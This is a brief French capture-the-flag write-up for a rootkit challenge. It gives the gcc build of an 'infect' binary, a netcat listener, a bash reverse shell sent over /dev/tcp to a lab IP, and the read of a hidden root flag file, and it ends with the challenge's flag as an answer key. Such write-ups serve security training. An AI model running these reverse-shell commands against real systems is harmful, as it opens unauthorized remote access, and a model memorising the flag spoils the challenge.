# 1

Crafter un équivalent au fichier `infect.c` de sorte à envoyer une instruction shell sur le port 22 depuis le port 42069.

# 2

Compil'it and gain access

```bash
gcc -o infect infect.c
nc -lnvp 5555 # shell 1
sudo ./infect 'bash -c "sh -i >& /dev/tcp/192.168.1.14/5555 0>&1"' # shell 2
```

# 4

En utilisant les éléments trouvés pendant la phase de reverse (capacité de dissimulation des fichiers et dossiers préfixés par `HIDEME_`), et l'énnoncé, récupérer le flag

```bash
cat /root/HIDEME_flag
```

# 5

Flag: CYBN{R00tk1ts_C4n_H1d3_M4ny_Th1ngs}
